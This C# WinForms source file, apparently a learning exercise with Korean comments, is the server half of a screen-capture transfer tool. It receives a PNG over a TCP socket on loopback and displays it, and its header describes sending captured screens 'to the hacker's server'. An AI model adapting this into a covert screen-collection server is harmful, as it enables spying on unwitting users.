using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
/*
[입력 화면 캡처 전송 - 서버]
 - 스크린을 캡춰하여 해커의 서버에 전송

#이벤트 핸들러
 - Form1_Load(object sender, EventArgs e) : 클라이언트 통신하는 스레드 생성
 - btnFile_Click(object sender, EventArgs e) : [파일 보기] 버튼, 수신된 이미지를 여는 작업 수행
 - Form1_FormClosing(object sender, FormClosingEventArgs e) : 추가로 생성된 스레드를 종료
*/
namespace mook_ScreenSer
{
    public partial class Form1 : Form
    {
        Thread SerThread = null;

        public Form1()
        {
            InitializeComponent();
        }

        //클라이언트 통신하는 스레드 생성
        private void Form1_Load(object sender, EventArgs e)
        {
            SerThread = new Thread(FileReceiver);
            SerThread.Start();
        }

        //스래드 내부 클래스, 클라이언트에서 전송하는 이미지 파일을 수신
        private void FileReceiver()
        {
            CheckForIllegalCrossThreadCalls = false;

            Socket mySocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint point = new IPEndPoint(IPAddress.Loopback, 8888); //원래는 상대방이 보내는 원격 IP주소를 써야 하는데 테스트를 위하여
                                                                         // 자신의 주소 IPAddress.Loopback(127.0.0.1)를 사용한다
            mySocket.Bind(point); //소켓을 지정도니 IP와 vhxm wjdqhdp Ekfk dusruf
            mySocket.Listen(1); //Socket.Listen(int) : System.Net.Sockets.Socket을 수신 상태로 둠, 매개변수는 보류중인 연결 큐의 최대 길이
                                //소켓을 수신상태로 두고 클라이언트 접속을 기다린다
            mySocket = mySocket.Accept(); //클라이언트 연결에 대한 새 Socket을 만드는 작업을 수행
            byte[] buffer = new byte[4]; //왜 4바이트씩 받지?
            mySocket.Receive(buffer); //수신된 버퍼에 바인딩된 Socket에서 데이터를 받는다, 이 작업으로 클라이언트에서 수신될 이미지 파일의 크기가 정해진다
            int fileLength = BitConverter.ToInt32(buffer, 0); //수신한 buffer바이트 배열을 인덱스 0부터 int로 변환
            buffer = new byte[1024];
            int totalLength = 0;
            FileStream fileStr = new FileStream("CaptureFile.png", FileMode.Create, FileAccess.Write);
            BinaryWriter writer = new BinaryWriter(fileStr); //이진 형식으로 스트림 fileStr에 UTF-8로 인코딩 된 문자열 쓰기를 지원하는
                                                             //BinaryReader 클래스의 개체인 reader를 생성

            this.pgbStatus.Minimum = 0;
            this.pgbStatus.Maximum = fileLength;
            while (totalLength < fileLength) 
            {
                int receiveLength = mySocket.Receive(buffer);
                writer.Write(buffer, 0, receiveLength);
                totalLength += receiveLength;

                this.pgbStatus.Value = totalLength;
                this.lblStatus.Text = "진행률 : " + ((int)((float)totalLength / (float)fileLength * 100.0)).ToString() + "%";
                Application.DoEvents();
            }
            fileStr.Close();
            mySocket.Close();
        }

        //[파일보기] 버튼 : myProcess.Start()메서드를 이용하여 클라이언트로부터 수신된 CaptureFile.png파일을 연다
        private void btnFile_Click(object sender, EventArgs e)
        {
            Process myProcess = new Process();
            myProcess.StartInfo.FileName = "CaptureFile.png";
            myProcess.Start();

        }

        //폼 클로징
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (SerThread != null) SerThread.Abort();
            Application.ExitThread(); //현재 스레드를 종료하고 모든 창을 닫는다
        }
    }
}
